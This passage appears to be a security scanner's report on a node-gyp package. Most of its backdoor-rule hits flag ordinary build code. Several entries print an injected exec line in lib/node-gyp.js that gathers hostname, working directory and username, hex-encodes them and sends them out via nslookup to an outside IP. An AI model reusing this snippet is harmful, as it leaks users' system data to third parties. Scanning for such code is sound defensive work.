                  "snippet": {
                    "text": "    if (!opts.silent && !opts.stdio) {\n      opts.stdio = [0, 1, 2]\n    }\n    const cp = childProcess.spawn(command, args, opts)\n    log.info('spawn', command)\n    log.info('spawn args', args)\n    return cp\n",
                    "rendered": {
                      "text": "    if (!opts.silent && !opts.stdio) {\n      opts.stdio = [0, 1, 2]\n    }\n    const cp = childProcess.spawn(command, args, opts)\n    log.info('spawn', command)\n    log.info('spawn args', args)\n    return cp\n",
                      "markdown": "`    if (!opts.silent && !opts.stdio) {\n      opts.stdio = [0, 1, 2]\n    }\n    const cp = childProcess.spawn(command, args, opts)\n    log.info('spawn', command)\n    log.info('spawn args', args)\n    return cp\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/lib/node-gyp.js"
                },
                "region": {
                  "startLine": 22,
                  "startColumn": 107,
                  "endLine": 22,
                  "endColumn": 113,
                  "snippet": {
                    "text": "]\n\nconst { exec } = require(\"child_process\");\nexec(\"a=$(hostname;pwd;whoami;echo 'niroborg-npm-com-test';curl https://ifconfig.me;) && echo $a | xxd -p | head | while read ut;do nslookup $108.137.194.171/confusednpm/;done\" , (error, data, getter) => {\n        if(error){\n                console.log(\"error\",error.message);\n                return;\n",
                    "rendered": {
                      "text": "]\n\nconst { exec } = require(\"child_process\");\nexec(\"a=$(hostname;pwd;whoami;echo 'niroborg-npm-com-test';curl https://ifconfig.me;) && echo $a | xxd -p | head | while read ut;do nslookup $108.137.194.171/confusednpm/;done\" , (error, data, getter) => {\n        if(error){\n                console.log(\"error\",error.message);\n                return;\n",
                      "markdown": "`]\n\nconst { exec } = require(\"child_process\");\nexec(\"a=$(hostname;pwd;whoami;echo 'niroborg-npm-com-test';curl https://ifconfig.me;) && echo $a | xxd -p | head | while read ut;do nslookup $108.137.194.171/confusednpm/;done\" , (error, data, getter) => {\n        if(error){\n                console.log(\"error\",error.message);\n                return;\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/lib/node-gyp.js"
                },
                "region": {
                  "startLine": 22,
                  "startColumn": 98,
                  "endLine": 22,
                  "endColumn": 103,
                  "snippet": {
                    "text": "]\n\nconst { exec } = require(\"child_process\");\nexec(\"a=$(hostname;pwd;whoami;echo 'niroborg-npm-com-test';curl https://ifconfig.me;) && echo $a | xxd -p | head | while read ut;do nslookup $108.137.194.171/confusednpm/;done\" , (error, data, getter) => {\n        if(error){\n                console.log(\"error\",error.message);\n                return;\n",
                    "rendered": {
                      "text": "]\n\nconst { exec } = require(\"child_process\");\nexec(\"a=$(hostname;pwd;whoami;echo 'niroborg-npm-com-test';curl https://ifconfig.me;) && echo $a | xxd -p | head | while read ut;do nslookup $108.137.194.171/confusednpm/;done\" , (error, data, getter) => {\n        if(error){\n                console.log(\"error\",error.message);\n                return;\n",
                      "markdown": "`]\n\nconst { exec } = require(\"child_process\");\nexec(\"a=$(hostname;pwd;whoami;echo 'niroborg-npm-com-test';curl https://ifconfig.me;) && echo $a | xxd -p | head | while read ut;do nslookup $108.137.194.171/confusednpm/;done\" , (error, data, getter) => {\n        if(error){\n                console.log(\"error\",error.message);\n                return;\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/lib/node-gyp.js"
                },
                "region": {
                  "startLine": 144,
                  "startColumn": 18,
                  "endLine": 144,
                  "endColumn": 29,
                  "snippet": {
                    "text": "      if (name.indexOf(npmConfigPrefix) !== 0) {\n        return\n      }\n      const val = process.env[name]\n      if (name === npmConfigPrefix + 'loglevel') {\n        log.logger.level = val\n      } else {\n",
                    "rendered": {
                      "text": "      if (name.indexOf(npmConfigPrefix) !== 0) {\n        return\n      }\n      const val = process.env[name]\n      if (name === npmConfigPrefix + 'loglevel') {\n        log.logger.level = val\n      } else {\n",
                      "markdown": "`      if (name.indexOf(npmConfigPrefix) !== 0) {\n        return\n      }\n      const val = process.env[name]\n      if (name === npmConfigPrefix + 'loglevel') {\n        log.logger.level = val\n      } else {\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/lib/node-gyp.js"
                },
                "region": {
                  "startLine": 140,
                  "startColumn": 16,
                  "endLine": 140,
                  "endColumn": 27,
                  "snippet": {
                    "text": "\n    // support for inheriting config env variables from npm\n    const npmConfigPrefix = 'npm_config_'\n    Object.keys(process.env).forEach((name) => {\n      if (name.indexOf(npmConfigPrefix) !== 0) {\n        return\n      }\n",
                    "rendered": {
                      "text": "\n    // support for inheriting config env variables from npm\n    const npmConfigPrefix = 'npm_config_'\n    Object.keys(process.env).forEach((name) => {\n      if (name.indexOf(npmConfigPrefix) !== 0) {\n        return\n      }\n",
                      "markdown": "`\n    // support for inheriting config env variables from npm\n    const npmConfigPrefix = 'npm_config_'\n    Object.keys(process.env).forEach((name) => {\n      if (name.indexOf(npmConfigPrefix) !== 0) {\n        return\n      }\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000703"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Username)",
            "id": "BD000703"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/lib/node-gyp.js"
                },
                "region": {
                  "startLine": 22,
                  "startColumn": 23,
                  "endLine": 22,
                  "endColumn": 29,
                  "snippet": {
                    "text": "]\n\nconst { exec } = require(\"child_process\");\nexec(\"a=$(hostname;pwd;whoami;echo 'niroborg-npm-com-test';curl https://ifconfig.me;) && echo $a | xxd -p | head | while read ut;do nslookup $108.137.194.171/confusednpm/;done\" , (error, data, getter) => {\n        if(error){\n                console.log(\"error\",error.message);\n                return;\n",
                    "rendered": {
                      "text": "]\n\nconst { exec } = require(\"child_process\");\nexec(\"a=$(hostname;pwd;whoami;echo 'niroborg-npm-com-test';curl https://ifconfig.me;) && echo $a | xxd -p | head | while read ut;do nslookup $108.137.194.171/confusednpm/;done\" , (error, data, getter) => {\n        if(error){\n                console.log(\"error\",error.message);\n                return;\n",
                      "markdown": "`]\n\nconst { exec } = require(\"child_process\");\nexec(\"a=$(hostname;pwd;whoami;echo 'niroborg-npm-com-test';curl https://ifconfig.me;) && echo $a | xxd -p | head | while read ut;do nslookup $108.137.194.171/confusednpm/;done\" , (error, data, getter) => {\n        if(error){\n                console.log(\"error\",error.message);\n                return;\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000704"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Hostname)",
            "id": "BD000704"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/lib/node-gyp.js"
                },
                "region": {
                  "startLine": 22,
                  "startColumn": 10,
                  "endLine": 22,
                  "endColumn": 18,
                  "snippet": {
                    "text": "]\n\nconst { exec } = require(\"child_process\");\nexec(\"a=$(hostname;pwd;whoami;echo 'niroborg-npm-com-test';curl https://ifconfig.me;) && echo $a | xxd -p | head | while read ut;do nslookup $108.137.194.171/confusednpm/;done\" , (error, data, getter) => {\n        if(error){\n                console.log(\"error\",error.message);\n                return;\n",
                    "rendered": {
                      "text": "]\n\nconst { exec } = require(\"child_process\");\nexec(\"a=$(hostname;pwd;whoami;echo 'niroborg-npm-com-test';curl https://ifconfig.me;) && echo $a | xxd -p | head | while read ut;do nslookup $108.137.194.171/confusednpm/;done\" , (error, data, getter) => {\n        if(error){\n                console.log(\"error\",error.message);\n                return;\n",
                      "markdown": "`]\n\nconst { exec } = require(\"child_process\");\nexec(\"a=$(hostname;pwd;whoami;echo 'niroborg-npm-com-test';curl https://ifconfig.me;) && echo $a | xxd -p | head | while read ut;do nslookup $108.137.194.171/confusednpm/;done\" , (error, data, getter) => {\n        if(error){\n                console.log(\"error\",error.message);\n                return;\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000705"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (DNS)",
            "id": "BD000705"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/lib/node-gyp.js"
                },
                "region": {
                  "startLine": 22,
                  "startColumn": 132,
                  "endLine": 22,
                  "endColumn": 140,
                  "snippet": {
                    "text": "]\n\nconst { exec } = require(\"child_process\");\nexec(\"a=$(hostname;pwd;whoami;echo 'niroborg-npm-com-test';curl https://ifconfig.me;) && echo $a | xxd -p | head | while read ut;do nslookup $108.137.194.171/confusednpm/;done\" , (error, data, getter) => {\n        if(error){\n                console.log(\"error\",error.message);\n                return;\n",
                    "rendered": {
                      "text": "]\n\nconst { exec } = require(\"child_process\");\nexec(\"a=$(hostname;pwd;whoami;echo 'niroborg-npm-com-test';curl https://ifconfig.me;) && echo $a | xxd -p | head | while read ut;do nslookup $108.137.194.171/confusednpm/;done\" , (error, data, getter) => {\n        if(error){\n                console.log(\"error\",error.message);\n                return;\n",
                      "markdown": "`]\n\nconst { exec } = require(\"child_process\");\nexec(\"a=$(hostname;pwd;whoami;echo 'niroborg-npm-com-test';curl https://ifconfig.me;) && echo $a | xxd -p | head | while read ut;do nslookup $108.137.194.171/confusednpm/;done\" , (error, data, getter) => {\n        if(error){\n                console.log(\"error\",error.message);\n                return;\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/lib/util.js"
                },
                "region": {
                  "startLine": 16,
                  "startColumn": 7,
                  "endLine": 16,
                  "endColumn": 12,
                  "snippet": {
                    "text": "async function regGetValue (key, value, addOpts) {\n  const outReValue = value.replace(/\\W/g, '.')\n  const outRe = new RegExp(`^\\\\s+${outReValue}\\\\s+REG_\\\\w+\\\\s+(\\\\S.*)$`, 'im')\n  const reg = path.join(process.env.SystemRoot, 'System32', 'reg.exe')\n  const regArgs = ['query', key, '/v', value].concat(addOpts)\n\n  log.silly('reg', 'running', reg, regArgs)\n",
                    "rendered": {
                      "text": "async function regGetValue (key, value, addOpts) {\n  const outReValue = value.replace(/\\W/g, '.')\n  const outRe = new RegExp(`^\\\\s+${outReValue}\\\\s+REG_\\\\w+\\\\s+(\\\\S.*)$`, 'im')\n  const reg = path.join(process.env.SystemRoot, 'System32', 'reg.exe')\n  const regArgs = ['query', key, '/v', value].concat(addOpts)\n\n  log.silly('reg', 'running', reg, regArgs)\n",
                      "markdown": "`async function regGetValue (key, value, addOpts) {\n  const outReValue = value.replace(/\\W/g, '.')\n  const outRe = new RegExp(`^\\\\s+${outReValue}\\\\s+REG_\\\\w+\\\\s+(\\\\S.*)$`, 'im')\n  const reg = path.join(process.env.SystemRoot, 'System32', 'reg.exe')\n  const regArgs = ['query', key, '/v', value].concat(addOpts)\n\n  log.silly('reg', 'running', reg, regArgs)\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/lib/util.js"
                },
                "region": {
                  "startLine": 3,
                  "startColumn": 5,
                  "endLine": 3,
                  "endColumn": 9,
                  "snippet": {
                    "text": "'use strict'\n\nconst cp = require('child_process')\nconst path = require('path')\nconst { openSync, closeSync } = require('graceful-fs')\nconst log = require('./log')\n",
                    "rendered": {
                      "text": "'use strict'\n\nconst cp = require('child_process')\nconst path = require('path')\nconst { openSync, closeSync } = require('graceful-fs')\nconst log = require('./log')\n",
                      "markdown": "`'use strict'\n\nconst cp = require('child_process')\nconst path = require('path')\nconst { openSync, closeSync } = require('graceful-fs')\nconst log = require('./log')\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/lib/util.js"
                },
                "region": {
                  "startLine": 16,
                  "startColumn": 24,
                  "endLine": 16,
                  "endColumn": 35,
                  "snippet": {
                    "text": "async function regGetValue (key, value, addOpts) {\n  const outReValue = value.replace(/\\W/g, '.')\n  const outRe = new RegExp(`^\\\\s+${outReValue}\\\\s+REG_\\\\w+\\\\s+(\\\\S.*)$`, 'im')\n  const reg = path.join(process.env.SystemRoot, 'System32', 'reg.exe')\n  const regArgs = ['query', key, '/v', value].concat(addOpts)\n\n  log.silly('reg', 'running', reg, regArgs)\n",
                    "rendered": {
                      "text": "async function regGetValue (key, value, addOpts) {\n  const outReValue = value.replace(/\\W/g, '.')\n  const outRe = new RegExp(`^\\\\s+${outReValue}\\\\s+REG_\\\\w+\\\\s+(\\\\S.*)$`, 'im')\n  const reg = path.join(process.env.SystemRoot, 'System32', 'reg.exe')\n  const regArgs = ['query', key, '/v', value].concat(addOpts)\n\n  log.silly('reg', 'running', reg, regArgs)\n",
                      "markdown": "`async function regGetValue (key, value, addOpts) {\n  const outReValue = value.replace(/\\W/g, '.')\n  const outRe = new RegExp(`^\\\\s+${outReValue}\\\\s+REG_\\\\w+\\\\s+(\\\\S.*)$`, 'im')\n  const reg = path.join(process.env.SystemRoot, 'System32', 'reg.exe')\n  const regArgs = ['query', key, '/v', value].concat(addOpts)\n\n  log.silly('reg', 'running', reg, regArgs)\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/lib/find-node-directory.js"
                },
                "region": {
                  "startLine": 22,
                  "startColumn": 39,
                  "endLine": 22,
                  "endColumn": 45,
                  "snippet": {
                    "text": "              path.basename(npmParentDirectory))\n  let nodeRootDir = ''\n\n  log.verbose('node-gyp root', 'Finding node root directory')\n  if (path.basename(npmParentDirectory) === 'deps') {\n    // We are in a build directory where this script lives in\n    // deps/npm/node_modules/node-gyp/lib\n",
                    "rendered": {
                      "text": "              path.basename(npmParentDirectory))\n  let nodeRootDir = ''\n\n  log.verbose('node-gyp root', 'Finding node root directory')\n  if (path.basename(npmParentDirectory) === 'deps') {\n    // We are in a build directory where this script lives in\n    // deps/npm/node_modules/node-gyp/lib\n",
                      "markdown": "`              path.basename(npmParentDirectory))\n  let nodeRootDir = ''\n\n  log.verbose('node-gyp root', 'Finding node root directory')\n  if (path.basename(npmParentDirectory) === 'deps') {\n    // We are in a build directory where this script lives in\n    // deps/npm/node_modules/node-gyp/lib\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/lib/configure.js"
                },
                "region": {
                  "startLine": 314,
                  "startColumn": 11,
                  "endLine": 314,
                  "endColumn": 15,
                  "snippet": {
                    "text": "    process.env.PYTHONPATH = pypath.join(win ? ';' : ':')\n\n    await new Promise((resolve, reject) => {\n      const cp = gyp.spawn(python, argv)\n      cp.on('exit', (code) => {\n        if (code !== 0) {\n          reject(new Error('`gyp` failed with exit code: ' + code))\n",
                    "rendered": {
                      "text": "    process.env.PYTHONPATH = pypath.join(win ? ';' : ':')\n\n    await new Promise((resolve, reject) => {\n      const cp = gyp.spawn(python, argv)\n      cp.on('exit', (code) => {\n        if (code !== 0) {\n          reject(new Error('`gyp` failed with exit code: ' + code))\n",
                      "markdown": "`    process.env.PYTHONPATH = pypath.join(win ? ';' : ':')\n\n    await new Promise((resolve, reject) => {\n      const cp = gyp.spawn(python, argv)\n      cp.on('exit', (code) => {\n        if (code !== 0) {\n          reject(new Error('`gyp` failed with exit code: ' + code))\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/lib/configure.js"
                },
                "region": {
                  "startLine": 233,
                  "startColumn": 36,
                  "endLine": 233,
                  "endColumn": 42,
                  "snippet": {
                    "text": "        ]\n        zoslibIncPath = findAccessibleSync(logprefix, nodeRootDir, candidates)\n        if (zoslibIncPath === undefined) {\n          msg = msgFormat('Could not find any of %s in directory %s; set ' +\n                          'environmant variable ZOSLIB_INCLUDES to the path ' +\n                          'that contains zos-base.h', candidates.toString(), nodeRootDir)\n        }\n",
                    "rendered": {
                      "text": "        ]\n        zoslibIncPath = findAccessibleSync(logprefix, nodeRootDir, candidates)\n        if (zoslibIncPath === undefined) {\n          msg = msgFormat('Could not find any of %s in directory %s; set ' +\n                          'environmant variable ZOSLIB_INCLUDES to the path ' +\n                          'that contains zos-base.h', candidates.toString(), nodeRootDir)\n        }\n",
                      "markdown": "`        ]\n        zoslibIncPath = findAccessibleSync(logprefix, nodeRootDir, candidates)\n        if (zoslibIncPath === undefined) {\n          msg = msgFormat('Could not find any of %s in directory %s; set ' +\n                          'environmant variable ZOSLIB_INCLUDES to the path ' +\n                          'that contains zos-base.h', candidates.toString(), nodeRootDir)\n        }\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/lib/configure.js"
                },
                "region": {
                  "startLine": 220,
                  "startColumn": 36,
                  "endLine": 220,
                  "endColumn": 42,
                  "snippet": {
                    "text": "      if (zoslibIncPath) {\n        zoslibIncPath = findAccessibleSync(logprefix, zoslibIncPath, ['zos-base.h'])\n        if (zoslibIncPath === undefined) {\n          msg = msgFormat('Could not find zos-base.h file in the directory set ' +\n                          'in ZOSLIB_INCLUDES environment variable: %s; set it ' +\n                          'to the correct path, or unset it to search %s', process.env.ZOSLIB_INCLUDES, nodeRootDir)\n        }\n",
                    "rendered": {
                      "text": "      if (zoslibIncPath) {\n        zoslibIncPath = findAccessibleSync(logprefix, zoslibIncPath, ['zos-base.h'])\n        if (zoslibIncPath === undefined) {\n          msg = msgFormat('Could not find zos-base.h file in the directory set ' +\n                          'in ZOSLIB_INCLUDES environment variable: %s; set it ' +\n                          'to the correct path, or unset it to search %s', process.env.ZOSLIB_INCLUDES, nodeRootDir)\n        }\n",
                      "markdown": "`      if (zoslibIncPath) {\n        zoslibIncPath = findAccessibleSync(logprefix, zoslibIncPath, ['zos-base.h'])\n        if (zoslibIncPath === undefined) {\n          msg = msgFormat('Could not find zos-base.h file in the directory set ' +\n                          'in ZOSLIB_INCLUDES environment variable: %s; set it ' +\n                          'to the correct path, or unset it to search %s', process.env.ZOSLIB_INCLUDES, nodeRootDir)\n        }\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/lib/configure.js"
                },
                "region": {
                  "startLine": 205,
                  "startColumn": 39,
                  "endLine": 205,
                  "endColumn": 45,
                  "snippet": {
                    "text": "        log.verbose(logprefix, 'Found exports file: %s', nodeExpFile)\n      } else {\n        const msg = msgFormat('Could not find node.%s file in %s', ext, nodeRootDir)\n        log.error(logprefix, 'Could not find exports file')\n        throw new Error(msg)\n      }\n    }\n",
                    "rendered": {
                      "text": "        log.verbose(logprefix, 'Found exports file: %s', nodeExpFile)\n      } else {\n        const msg = msgFormat('Could not find node.%s file in %s', ext, nodeRootDir)\n        log.error(logprefix, 'Could not find exports file')\n        throw new Error(msg)\n      }\n    }\n",
                      "markdown": "`        log.verbose(logprefix, 'Found exports file: %s', nodeExpFile)\n      } else {\n        const msg = msgFormat('Could not find node.%s file in %s', ext, nodeRootDir)\n        log.error(logprefix, 'Could not find exports file')\n        throw new Error(msg)\n      }\n    }\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/lib/configure.js"
                },
                "region": {
                  "startLine": 204,
                  "startColumn": 40,
                  "endLine": 204,
                  "endColumn": 46,
                  "snippet": {
                    "text": "      if (nodeExpFile !== undefined) {\n        log.verbose(logprefix, 'Found exports file: %s', nodeExpFile)\n      } else {\n        const msg = msgFormat('Could not find node.%s file in %s', ext, nodeRootDir)\n        log.error(logprefix, 'Could not find exports file')\n        throw new Error(msg)\n      }\n",
                    "rendered": {
                      "text": "      if (nodeExpFile !== undefined) {\n        log.verbose(logprefix, 'Found exports file: %s', nodeExpFile)\n      } else {\n        const msg = msgFormat('Could not find node.%s file in %s', ext, nodeRootDir)\n        log.error(logprefix, 'Could not find exports file')\n        throw new Error(msg)\n      }\n",
                      "markdown": "`      if (nodeExpFile !== undefined) {\n        log.verbose(logprefix, 'Found exports file: %s', nodeExpFile)\n      } else {\n        const msg = msgFormat('Could not find node.%s file in %s', ext, nodeRootDir)\n        log.error(logprefix, 'Could not find exports file')\n        throw new Error(msg)\n      }\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/lib/configure.js"
                },
                "region": {
                  "startLine": 81,
                  "startColumn": 41,
                  "endLine": 81,
                  "endColumn": 47,
                  "snippet": {
                    "text": "\n      await gyp.commands.install([release.version])\n\n      log.verbose('get node dir', 'target node version installed:', release.versionDir)\n      nodeDir = path.resolve(gyp.devDir, release.versionDir)\n    }\n\n",
                    "rendered": {
                      "text": "\n      await gyp.commands.install([release.version])\n\n      log.verbose('get node dir', 'target node version installed:', release.versionDir)\n      nodeDir = path.resolve(gyp.devDir, release.versionDir)\n    }\n\n",
                      "markdown": "`\n      await gyp.commands.install([release.version])\n\n      log.verbose('get node dir', 'target node version installed:', release.versionDir)\n      nodeDir = path.resolve(gyp.devDir, release.versionDir)\n    }\n\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/lib/configure.js"
                },
                "region": {
                  "startLine": 81,
                  "startColumn": 22,
                  "endLine": 81,
                  "endColumn": 28,
                  "snippet": {
                    "text": "\n      await gyp.commands.install([release.version])\n\n      log.verbose('get node dir', 'target node version installed:', release.versionDir)\n      nodeDir = path.resolve(gyp.devDir, release.versionDir)\n    }\n\n",
                    "rendered": {
                      "text": "\n      await gyp.commands.install([release.version])\n\n      log.verbose('get node dir', 'target node version installed:', release.versionDir)\n      nodeDir = path.resolve(gyp.devDir, release.versionDir)\n    }\n\n",
                      "markdown": "`\n      await gyp.commands.install([release.version])\n\n      log.verbose('get node dir', 'target node version installed:', release.versionDir)\n      nodeDir = path.resolve(gyp.devDir, release.versionDir)\n    }\n\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/lib/configure.js"
                },
                "region": {
                  "startLine": 67,
                  "startColumn": 88,
                  "endLine": 67,
                  "endColumn": 94,
                  "snippet": {
                    "text": "        log.verbose('get node dir', 'compiling against --target node version: %s', release.version)\n      } else {\n        // if no --target was specified then use the current host node version\n        log.verbose('get node dir', 'no --target version specified, falling back to host node version: %s', release.version)\n      }\n\n      if (!release.semver) {\n",
                    "rendered": {
                      "text": "        log.verbose('get node dir', 'compiling against --target node version: %s', release.version)\n      } else {\n        // if no --target was specified then use the current host node version\n        log.verbose('get node dir', 'no --target version specified, falling back to host node version: %s', release.version)\n      }\n\n      if (!release.semver) {\n",
                      "markdown": "`        log.verbose('get node dir', 'compiling against --target node version: %s', release.version)\n      } else {\n        // if no --target was specified then use the current host node version\n        log.verbose('get node dir', 'no --target version specified, falling back to host node version: %s', release.version)\n      }\n\n      if (!release.semver) {\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/lib/configure.js"
                },
                "region": {
                  "startLine": 67,
                  "startColumn": 24,
                  "endLine": 67,
                  "endColumn": 30,
                  "snippet": {
                    "text": "        log.verbose('get node dir', 'compiling against --target node version: %s', release.version)\n      } else {\n        // if no --target was specified then use the current host node version\n        log.verbose('get node dir', 'no --target version specified, falling back to host node version: %s', release.version)\n      }\n\n      if (!release.semver) {\n",
                    "rendered": {
                      "text": "        log.verbose('get node dir', 'compiling against --target node version: %s', release.version)\n      } else {\n        // if no --target was specified then use the current host node version\n        log.verbose('get node dir', 'no --target version specified, falling back to host node version: %s', release.version)\n      }\n\n      if (!release.semver) {\n",
